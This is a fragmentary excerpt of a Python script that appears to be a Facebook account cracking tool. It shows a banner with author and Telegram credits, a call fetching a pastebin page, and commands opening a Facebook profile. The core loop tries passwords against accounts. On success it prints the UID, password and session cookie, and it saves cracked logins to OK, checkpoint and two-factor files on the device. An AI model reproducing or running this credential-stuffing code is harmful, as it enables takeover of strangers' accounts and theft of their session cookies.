...
os.system('am start https://www.facebook.com/profile.php?id=100074081633562')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100074081633562")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/4nLkKAiD").text
...
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝
  ...
  AUTHOR   :   Abdul Rahim Al-Zatrini👏
  
  
  Telegram    :  @a_bd_o5🫲🏻
  
  
  Facebook   : Abdul Rahim Al-Zatrini☝
...
def xyz():
    ...
    os.system("clear");
    print(logo)
    print('           \x1b[97m[\033[37;41m Abdul Rahim Al-Zatrini   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  Abdul Rahim Al-Zatrini   \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(
                    '\r\033[1;32m[√]---------------------[Abdul Rahim Al-Zatrini-OK😁👊🏻]--------------------[√]\nNUMBER : ' + uid + '\nUID   : ' + cid + ' √ ' + ps + '\nCOOKIE   : ' + coki + '\n[√]---------------------------------------------------[√]')
                cek_apk(session, coki)
                open('/sdcard/Abdul Rahim Al-Zatrini-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
                oks.append(cid)
                break
                ...
                Red = '\033[1;31m'
                print(
                    f'\r{Red}[×]--------------------[Abdul Rahim Al-Zatrini-CP😥🥺]---------------------[×]\nNUMBER : ' + uid + '\nUID   : ' + cid + ' √ ' + ps + '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/Abdul Rahim Al-Zatrini-CP.txt', 'a').write(cid + ' | ' + ps + '\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Abdul Rahim Al-Zatrini-2F.txt', 'a').write(cid + ' | ' + ps + '\n')
                twf.append(cid)
            else:
                continue
        loop += 1
        sys.stdout.write(f'\r\33[1;37m[Abdul Rahim Al-Zatrini ] [%s]\33[1;97m [OK:%s~CP:%s]' % (loop, len(oks), len(cps))),
        sys.stdout.flush()
        checks(oks, cps, twf)
    except:
        pass
